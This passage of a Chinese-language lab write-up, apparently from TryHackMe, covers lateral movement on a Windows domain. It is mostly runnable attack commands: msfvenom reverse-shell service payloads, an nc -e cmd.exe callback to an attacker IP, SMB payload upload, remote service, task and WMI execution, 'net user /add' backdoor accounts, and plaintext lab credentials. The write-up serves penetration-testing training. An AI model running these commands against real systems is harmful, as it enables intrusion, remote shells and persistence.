#ABB2BF"> /</span><span style="color: #E06C75">st</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">00</span><span style="color: #ABB2BF">:</span><span style="color: #D19A66">00</span><span style="color: #ABB2BF"> </span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 手动运行计划任务</span></span><span class="line"><span style="color: #ABB2BF"># 因为是计划任务，所以命令的回显不会显示</span></span><span class="line"><span style="color: #E06C75">schtasks</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">s</span><span style="color: #ABB2BF"> THMIIS.za.tryhackme.</span><span style="color: #E06C75">com</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">run</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">TN</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;THMtask1&quot;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 删除计划任务</span></span><span class="line"><span style="color: #E06C75">schtasks</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">S</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">TARGET</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">TN</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;THMtask1&quot;</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">DELETE</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">F</span></span></code></pre></div></div></figure><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF"># 创建服务小马</span></span><span class="line"><span style="color: #E06C75">msfvenom</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">p</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">windows</span><span style="color: #ABB2BF">/</span><span style="color: #E06C75">shell</span><span style="color: #ABB2BF">/</span><span style="color: #E06C75">reverse_tcp</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">f</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF">-</span><span style="color: #E06C75">service</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">LHOST</span><span style="color: #ABB2BF">=</span><span style="color: #D19A66">10.50.46.241</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">LPORT</span><span style="color: #ABB2BF">=</span><span style="color: #D19A66">4444</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">o</span><span style="color: #ABB2BF"> myservice666.exe</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 传小马</span></span><span class="line"><span style="color: #E06C75">smbclient</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">c</span><span style="color: #ABB2BF"> </span><span style="color: #7F848E; font-style: italic">&#39;put myservice666.exe&#39; -U t1_leonard.summers -W ZA &#39;//thmiis.za.tryhackme.com/admin$/&#39; EZpass4ever</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 创建好 handler</span></span><span class="line"><span style="color: #E06C75">msfconsole</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">q</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">x</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit&quot;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 使用指定用户凭据反弹 Shell 回来</span></span><span class="line"><span style="color: #E06C75">runas</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">netonly</span><span style="color: #ABB2BF"> /</span><span style="color: #E06C75">user</span><span style="color: #ABB2BF">:ZA.TRYHACKME.</span><span style="color: #E06C75">COM</span><span style="color: #ABB2BF">\t1_leonard.summers </span><span style="color: #98C379">&quot;c:\tools\nc64.exe -e cmd.exe 10.50.46.241 4448&quot;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 用 sc 创建服务</span></span><span class="line"><span style="color: #ABB2BF">sc.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> \\thmiis.za.tryhackme.com create </span><span style="color: #E06C75">THMservice</span><span style="color: #D19A66">-666</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">binPath</span><span style="color: #ABB2BF">= </span><span style="color: #98C379">&quot;%windir%\myservice666.exe&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">start</span><span style="color: #ABB2BF">=</span><span style="color: #E06C75"> auto</span></span><span class="line"><span style="color: #ABB2BF">sc.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> \\thmiis.za.tryhackme.com start </span><span style="color: #E06C75">THMservice</span><span style="color: #D19A66">-666</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"># 注意这个 flag 必须要通过服务生成的 Shell 才能执行</span></span><span class="line"><span style="color: #ABB2BF"># 刚开始还以为和执行的用户有关</span></span><span class="line"><span style="color: #ABB2BF"># whoami 是 SYSTEM 执行他也能出 flag</span></span><span class="line"><span style="color: #ABB2BF"># 尝试过 PSEXEC 和 nc 反弹 shell 都不行</span></span><span class="line"><span style="color: #ABB2BF"># 生成普通马然后创建服务执行也不行 必须要服务马</span></span><span class="line"><span style="color: #ABB2BF"># 执行 Flag.exe</span></span><span class="line"><span style="color: #ABB2BF">c:\</span><span style="color: #E06C75">Users</span><span style="color: #ABB2BF">\t1_leonard.</span><span style="color: #E06C75">summers</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Desktop</span><span style="color: #ABB2BF">\Flag.exe</span></span></code></pre></div></div></figure><h2 id="通过-WMI-横向移动"><a href="#通过-WMI-横向移动" class="headerlink" title="通过 WMI 横向移动"></a>通过 WMI 横向移动</h2><p>WMI (Windows Management Instrumentation) 是 Windows 对 WBEM (Web-Based Enterprise Management) 的实现。WBEM 是一项用于跨设备访问管理信息的企业标准。</p><p>所有的操作都需要 <strong>Administrators 组</strong>的权限。</p><h3 id="通过-PowerShell-连接-WMI"><a href="#通过-PowerShell-连接-WMI" class="headerlink" title="通过 PowerShell 连接 WMI"></a>通过 PowerShell 连接 WMI</h3><p>同样要创建 PSCredential 对象。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$username</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;Administrator&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">$password</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;Mypass123&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">$securePassword</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">ConvertTo-SecureString</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$password</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">AsPlainText </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Force;</span></span><span class="line"><span style="color: #E06C75">$credential</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">New-Object</span><span style="color: #ABB2BF"> System.Management.Automation.PSCredential </span><span style="color: #E06C75">$username</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$securePassword</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure><p>可以通过下面的任意一个协议建立 WMI 会话</p><ul><li><strong>DCOM:</strong> RPC over IP will be used for connecting to WMI. This protocol uses port 135&#x2F;TCP and ports 49152-65535&#x2F;TCP, just as explained when using sc.exe.</li><li><strong>Wsman:</strong> WinRM will be used for connecting to WMI. This protocol uses ports 5985&#x2F;TCP (WinRM HTTP) or 5986&#x2F;TCP (WinRM HTTPS).</li></ul><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$Opt</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">New-CimSessionOption</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Protocol DCOM</span></span><span class="line"><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">New-Cimsession</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ComputerName TARGET </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Credential </span><span style="color: #E06C75">$credential</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">SessionOption </span><span style="color: #E06C75">$Opt</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ErrorAction Stop</span></span></code></pre></div></div></figure><p><code>New-CimSessionOption</code> 是配置 WMI 会话连接参数，然后将选项和凭证传递给 <code>New-CimSession</code> cmdlet，以建立远程主机会话。</p><h4 id="通过-WMI-远程创建进程"><a href="#通过-WMI-远程创建进程" class="headerlink" title="通过 WMI 远程创建进程"></a>通过 WMI 远程创建进程</h4><ul><li>Ports:<ul><li>135&#x2F;TCP, 49152-65535&#x2F;TCP (DCERPC)</li><li>5985&#x2F;TCP (WinRM HTTP) or 5986&#x2F;TCP (WinRM HTTPS)</li></ul></li><li><strong>Required Group Memberships:</strong> Administrators</li></ul><p>我们可以利用 Windows 管理工具（WMI）从 Powershell 远程启动进程，向 Win32_Process 类发送 WMI 请求，在我们之前创建的会话下启动进程。WMI 不会回显，不会看到任何输出</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 创建 text.txt 写入 munrawashere</span></span><span class="line"><span style="color: #E06C75">$Command</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 执行小马 必须要完整路径</span></span><span class="line"><span style="color: #E06C75">$Command</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;C:\Windows\payload.exe&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">Invoke-CimMethod</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CimSession </span><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ClassName Win32_Process </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">MethodName Create </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Arguments </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">CommandLine</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$Command</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 旧环境执行方法</span></span><span class="line"><span style="color: #56B6C2">wmic.exe</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">user:Administrator </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">password:Mypass123 </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">node:TARGET </span><span style="color: #C678DD">process</span><span style="color: #ABB2BF"> call create </span><span style="color: #98C379">&quot;cmd.exe /c calc.exe&quot;</span><span style="color: #ABB2BF"> </span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 我跑不起来 提示 Access denied</span></span><span class="line"><span style="color: #56B6C2">wmic.exe</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">user:</span><span style="color: #56B6C2">ZA.TRYHACKME.COM</span><span style="color: #ABB2BF">\t1_corine.waters </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">password:Korine.</span><span style="color: #D19A66">1994</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">node:</span><span style="color: #56B6C2">THMIIS.za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">process</span><span style="color: #ABB2BF"> call create </span><span style="color: #98C379">&quot;C:\Windows\payload.exe&quot;</span></span></code></pre></div></div></figure><h4 id="通过-WMI-远程创建服务"><a href="#通过-WMI-远程创建服务" class="headerlink" title="通过 WMI 远程创建服务"></a>通过 WMI 远程创建服务</h4><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 创建一个 THMService2 的服务</span></span><span class="line"><span style="color: #56B6C2">Invoke-CimMethod</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CimSession </span><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ClassName Win32_Service </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">MethodName Create </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Arguments </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">Name</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;THMService2&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">DisplayName</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;THMService2&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">PathName</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;net user munra2 Pass123 /add&quot;</span><span style="color: #ABB2BF">; </span><span style="color: #7F848E; font-style: italic"># Your payload</span></span><span class="line"><span style="color: #E06C75">ServiceType</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">]::Parse(</span><span style="color: #98C379">&quot;16&quot;</span><span style="color: #ABB2BF">); </span><span style="color: #7F848E; font-style: italic"># Win32OwnProcess : Start service in a new process</span></span><span class="line"><span style="color: #E06C75">StartMode</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Manual&quot;</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 创建一个执行小马的服务</span></span><span class="line"><span style="color: #56B6C2">Invoke-CimMethod</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CimSession </span><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ClassName Win32_Service </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">MethodName Create </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Arguments </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">Name</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;THMService2&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">DisplayName</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;THMService2&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">PathName</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;%windir%\payload.exe&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">ServiceType</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">]::Parse(</span><span style="color: #98C379">&quot;16&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">StartMode</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Manual&quot;</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 启动服务</span></span><span class="line"><span style="color: #E06C75">$Service</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">Get-CimInstance</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CimSession </span><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ClassName Win32_Service </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">filter </span><span style="color: #98C379">&quot;Name LIKE &#39;THMService2&#39;&quot;</span></span><span class="line"><span style="color: #56B6C2">Invoke-CimMethod</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">InputObject </span><span style="color: #E06C75">$Service</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">MethodName StartService</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 停止和删除服务</span></span><span class="line"><span style="color: #56B6C2">Invoke-CimMethod</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">InputObject </span><span style="color: #E06C75">$Service</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">MethodName StopService</span></span><span class="line"><span style="color: #56B6C2">Invoke-CimMethod</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">InputObject </span><span style="color: #E06C75">$Service</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">MethodName Delete</span></span></code></pre></div></div></figure><p><strong>ServiceType &#x3D; [byte]::Parse(“16”)</strong> 是一个 PowerShell 表达式，用于指定 Windows 服务的类型。这里的 <code>16</code> 是一个代表特定服务类型的数值，它对应于 Windows API 中的 <code>SERVICE_WIN32_OWN_PROCESS</code> 常量。</p><p>在 Windows 服务编程中，服务的类型决定了服务如何运行：</p><ul><li>**<code>ServiceType = 16</code> (十六进制 <code>0x10</code>)**：代表 <strong><code>SERVICE_WIN32_OWN_PROCESS</code><strong>。这意味着服务将以</strong>独立进程</strong>的形式运行，拥有自己独立的内存空间。这是最常见的服务类型，也是这里所使用的。</li></ul><h4 id="通过-WMI-远程创建计划任务"><a href="#通过-WMI-远程创建计划任务" class="headerlink" title="通过 WMI 远程创建计划任务"></a>通过 WMI 远程创建计划任务</h4><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># Payload must be split in Command and Args</span></span><span class="line"><span style="color: #E06C75">$Command</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;cmd.exe&quot;</span></span><span class="line"><span style="color: #ABB2BF">$Args </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;/c net user munra22 aSdf1234 /add&quot;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">$Action</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">New-ScheduledTaskAction</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CimSession </span><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Execute </span><span style="color: #E06C75">$Command</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Argument $Args</span></span><span class="line"><span style="color: #56B6C2">Register-ScheduledTask</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CimSession </span><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Action </span><span style="color: #E06C75">$Action</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">User </span><span style="color: #98C379">&quot;NT AUTHORITY\SYSTEM&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">TaskName </span><span style="color: #98C379">&quot;THMtask2&quot;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 远程执行小马示例</span></span><span class="line"><span style="color: #E06C75">$Command</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;%windir%\payload.exe&quot;</span></span><span class="line"><span style="color: #E06C75">$Action</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">New-ScheduledTaskAction</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CimSession </span><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Execute </span><span style="color: #E06C75">$Command</span></span><span class="line"><span style="color: #56B6C2">Register-ScheduledTask</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CimSession </span><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Action </span><span style="color: #E06C75">$Action</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">User </span><span style="color: #98C379">&quot;NT AUTHORITY\SYSTEM&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">TaskName </span><span style="color: #98C379">&quot;THMtask2&quot;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 启动计划任务</span></span><span class="line"><span style="color: #56B6C2">Start-ScheduledTask</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CimSession </span><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">TaskName </span><span style="color: #98C379">&quot;THMtask2&quot;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 删除计划任务</span></span><span class="line"><span style="color: #56B6C2">Unregister-ScheduledTask</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CimSession </span><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">TaskName </span><span style="color: #98C379">&quot;THMtask2&quot;</span></span></code></pre></div></div></figure><h4 id="通过-WMI-安装-MSI-包"><a href="#通过-WMI-安装-MSI-包" class="headerlink" title="通过 WMI 安装 MSI 包"></a>通过 WMI 安装 MSI 包</h4><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">Invoke-CimMethod</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CimSession </span><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ClassName Win32_Product </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">MethodName Install </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Arguments </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">{</span><span style="color: #E06C75">PackageLocation</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;C:\Windows\myinstaller.msi&quot;</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">Options</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">AllUsers</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">$false</span><span style="color: #ABB2BF">}</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 传统方式实现</span></span><span class="line"><span style="color: #ABB2BF">wmic </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">node:TARGET </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">user:DOMAIN\USER product call install PackageLocation</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">c:\Windows\myinstaller.msi</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 同样跑不起来 Access Denied</span></span><span class="line"><span style="color: #ABB2BF">wmic </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">node:</span><span style="color: #56B6C2">THMIIS.za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">user:</span><span style="color: #56B6C2">ZA.TRYHACKME.COM</span><span style="color: #ABB2BF">\t1_corine.waters </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">password:Korine.</span><span style="color: #D19A66">1994</span><span style="color: #ABB2BF"> product call install PackageLocation</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">c:\Windows\myinstaller88.msi</span></span></code></pre></div></div></figure><h3 id="实践-1"><a href="#实践-1" class="headerlink" title="实践"></a>实践</h3><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 创建 MSI 马</span></span><span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/shell/reverse_tcp</span><span style="color: #ABB2BF"> 